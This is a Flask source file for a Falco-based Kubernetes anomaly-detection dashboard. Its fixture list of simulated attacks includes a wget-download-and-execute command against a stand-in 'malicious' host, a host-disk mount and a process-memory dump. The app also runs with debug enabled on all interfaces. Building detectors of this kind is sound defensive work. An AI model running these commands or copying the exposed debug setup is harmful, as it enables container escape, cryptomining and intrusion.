from flask import Flask, render_template, request, jsonify
from datetime import datetime
from model import AegisDetector 
import random

app = Flask(__name__)

# Initialisation du détecteur
detector = AegisDetector()
anomalies = []

KNOWN_ATTACKS = [
    {
        "rule": "Drop and execute new binary in container",
        "priority": "Critical",
        "output_fields": {
            "k8s.pod.name": "lightspin-simulator-pod", # Nom arbitraire pour le visuel
            "k8s.ns.name": "default",
            "container.name": "simulation",
            "proc.name": "xmrig", # ⚠️ Remplace par le processus exact de ta ligne 0
            "proc.cmdline": "wget http://malicious/payload -O /tmp/payload && chmod +x /tmp/payload && /tmp/payload" # Longueur ~151 selon ton tableau
        }
    },
    {
        "rule": "Mount inside container",
        "priority": "Critical",
        "output_fields": {
            "k8s.pod.name": "lightspin-simulator-pod",
            "k8s.ns.name": "default",
            "container.name": "simulation",
            "proc.name": "runc:[1:CHILD]", # ⚠️ Remplace par le processus exact de ta ligne 1
            "proc.cmdline": "mount /dev/sda1 /mnt/host" # Longueur ~19 selon ton tableau
        }
    },
    {
        "rule": "Read process memory in container",
        "priority": "Critical",
        "output_fields": {
            "k8s.pod.name": "lightspin-simulator-pod",
            "k8s.ns.name": "default",
            "container.name": "simulation",
            "proc.name": "dd", # ⚠️ Remplace par le processus exact de ta ligne 2
            "proc.cmdline": "cat /proc/1/mem > /tmp/memory_dump.bin" # Longueur ~74 selon ton tableau
        }
    },
    {
        "rule": "Write below etc in container",
        "priority": "Warning",
        "output_fields": {
            "k8s.pod.name": "prometheus-config-reloader",
            "k8s.ns.name": "monitoring",
            "container.name": "config-reloader",
            "proc.name": "prometheus-conf", # ⚠️ Remplace par le processus exact de ta ligne 3
            "proc.cmdline": "sed -i 's/old/new/g' /etc/prometheus/prometheus.yml" # Longueur ~499 selon ton tableau
        }
    }
]

@app.route('/')
def dashboard():
    # Affichage des événements, les plus récents en premier
    sorted_events = sorted(anomalies, key=lambda x: x['timestamp'], reverse=True)
    return render_template('screen-board.html', anomalies=sorted_events)

@app.route('/api/webhook', methods=['POST'])
def webhook():
    event = request.get_json()
    if not event:
        return jsonify({"error": "No data"}), 400
    
    
    df_vector = detector.preprocess(event)
    print(df_vector.info())
    return jsonify({"Status": "Df imported correctly"}), 200
    
    # output_fields = event.get('output_fields', {})

    # --- ÉTAPE IA : Preprocessing + Verdict ---
    verdict_text, is_anomaly = detector.get_verdict(df_vector)

    # --- PRÉPARATION POUR LE DASHBOARD ---
    processed_event = {
        'timestamp': event.get('time', datetime.now().isoformat()),
        'rule': event.get('rule', 'unknown'),
        'priority': event.get('priority', 'unknown'),
        'pod_name': output_fields.get('k8s.pod.name', 'unknown'),
        'namespace': output_fields.get('k8s.ns.name', 'unknown'),
        'proc_name': output_fields.get('proc.name', 'unknown'),
        'proc_cmdline': output_fields.get('proc.cmdline', 'unknown'),
        'verdict': verdict_text,
        'is_anomaly': is_anomaly
    }

    anomalies.append(processed_event)
    
    # On limite la liste pour éviter de saturer la RAM en cas de flood
    if len(anomalies) > 500:
        anomalies.pop(0)

    print(f"📡 Event: {processed_event['rule']} | Verdict: {verdict_text}")
    return jsonify({"status": "processed", "verdict": verdict_text}), 200


@app.route('/api/simulate', methods=['POST'])
def simulate_attack():
    """Sélectionne une attaque au hasard et la traite comme si elle venait de Falco"""
    # 1. On choisit une attaque au hasard
    attack_event = random.choice(KNOWN_ATTACKS)
    
    # 2. On simule les données Falco
    output_fields = attack_event.get('output_fields', {})
    
    # 3. On passe l'événement à l'IA (exactement comme le vrai webhook)
    df_vector = detector.preprocess(output_fields)
    verdict_text, is_anomaly = detector.get_verdict(df_vector)
    
    # 4. On prépare l'affichage
    processed_event = {
        'timestamp': datetime.now().isoformat(),
        'rule': attack_event['rule'],
        'priority': attack_event['priority'],
        'pod_name': output_fields.get('k8s.pod.name', 'unknown'),
        'namespace': output_fields.get('k8s.ns.name', 'unknown'),
        'proc_name': output_fields.get('proc.name', 'unknown'),
        'proc_cmdline': output_fields.get('proc.cmdline', 'unknown'),
        'verdict': verdict_text,
        'is_anomaly': is_anomaly
    }
    
    anomalies.append(processed_event)
    if len(anomalies) > 500:
        anomalies.pop(0)
        
    return jsonify({"status": "success", "message": "Attaque simulée avec succès"}), 200


if __name__ == '__main__':
    # Écoute sur toutes les interfaces pour accepter le tunnel (Cloudflare/Ngrok)
    app.run(host='0.0.0.0', port=5000, debug=True)

